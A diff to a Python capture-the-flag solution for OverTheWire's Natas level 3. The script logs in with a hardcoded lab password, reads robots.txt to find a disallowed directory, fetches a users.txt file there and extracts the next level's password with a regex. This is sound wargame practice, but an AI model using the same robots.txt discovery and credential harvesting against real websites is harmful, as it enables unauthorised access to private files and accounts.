@@ -3,6 +3,7 @@
 https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas3.py
 https://www.youtube.com/watch?v=_u9Zb1TsUks&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=2  4:05
 https://docs.python-requests.org/en/master/
+http://www.robotstxt.org/robotstxt.html
 
 Level 3 → Level 4
 Username: natas3
@@ -38,14 +39,30 @@ import re
 
 username = 'natas3'
 password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
-
+  
 url = 'http://%s.natas.labs.overthewire.org/' % username
+url_robots = url+'/robots.txt' 
 
+print(url)
 reponse = requests.get(url, auth = (username, password))
+content = reponse.text
+print(content)
+print(url_robots)
+reponse = requests.get(url_robots, auth = (username, password))
 content = reponse.text
 
  
  
-print (content)
+print ('\n\nContent of  [ robots.txt file ]  \n\n', content)
 
-  
+reply = re.findall('Disallow: /(.*)', content)[0]
+print (reply)
+
+url_sec =  url+ reply+'users.txt'  
+print(url_sec)  
+
+reponse = requests.get(url_sec, auth = (username, password))
+content = reponse.text
+print(content)
+reply = re.findall('natas4:(.*)', content)[0]
+print (reply)
